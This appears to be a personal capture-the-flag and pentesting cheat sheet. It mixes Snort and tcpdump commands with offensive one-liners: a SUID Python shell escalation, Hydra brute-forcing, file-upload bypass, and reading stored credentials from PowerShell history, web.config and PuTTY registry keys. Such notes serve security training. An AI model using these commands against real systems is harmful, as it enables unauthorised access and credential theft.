# Useful commands
Collection of useful knowledge, commands, and shortcuts.

## Working with packets

Use `tcpdump` to read .pcap files in the command line. Useful for when you don't have access to WireShark.

```tcpdump -qns 0 -X -r file.pcap```

#### Snort Rules

Detect login attempts with the "Administrator" account and a wrong/no password.

```alert tcp any 21 <> any any (msg: "FAILED LOGIN"; content: "331 Password"; content: "Administrator"; sid: 1000004; rev:1;)```

Dump raw packet data

```sudo snort -v -X -r snort.log.xxxxxxx```

Run Snort as IPS on interfaces eth0 and eth1

```sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A full```

## Reconnaissance

#### NMAP

Default scan suitable for most networks.

```nmap -sV -sC -O <ip>```

## CTFs

#### Finding flags

Find flag specifying filetype and name and output errors to dev/null

```find / -type f -name <flag> 2>/dev/null```

### Privilege escalation

Refer to [https://gtfobins.github.io/](https://gtfobins.github.io/) for more methods.

##### Find files with SUID permissions

```find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null```

If for example we find that python has SUID permissions, we can move to the python directory and escalate privileges with:

```./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'```

#### Find writable directories/files

```find / -writable -type d 2>/dev/null ```

#### Setup a python http server to download files from attacker machine to target machine.

```python -m http.server```

#### Use gcc to compile a C program

```gcc exploit.c -o exploit```

### Brute-forcing

#### Hydra brute force ftp with known username

```hydra -v -l <user> -P <Password File> <service>://<server>:<port>```

### Steganography

#### Extract hidden info from png/jpg using steghide

```steghide extract -sf <file>```

#### Use Binwalk to extract hidden files within files

```binwalk <file> -e```


### Windows

#### Powershell History

Check powershell history (must be run from cmd.exe)

```%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt```

#### IIS

Find database connection strings on the file:

```type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString```

#### PuTTY

Retrieve stored proxy credentials, the command searches for ProxyPassword in a registry key.

```reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s```

## Output formatting

#### Cut

```cat``` the contents of /etc/passwd and pass them through ```cut``` to extract the first field delimited by a colon

 ```cat /etc/passwd | cut -d ":" -f 1```

# Methodology

Reminders for when you get stuck.

### Privilege Escalation

- Check what files you can run as sudo.
- Check for SUID bit set.
```find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null```
- Check cron jobs
```cat /etc/crontab```
- Check for execute permissions when taking over cron jobs.
- Check $PATH for write privileges to any of the folder in $PATH.
- Check if I can modify $PATH
- Check for misconfigured NFS. If a writable share has the "no_root_squash" option set then we can leverage that.
```cat /etc/exports```

### Bypassing file upload restrictions

- Turn off javascript in browser (if webapp doesn't depend on it)
- Intercept and modify the **incoming** page with Burp.
- Intercept and modify the **file upload** with Burp.
- Send the file directly to the upload point.
```curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>```
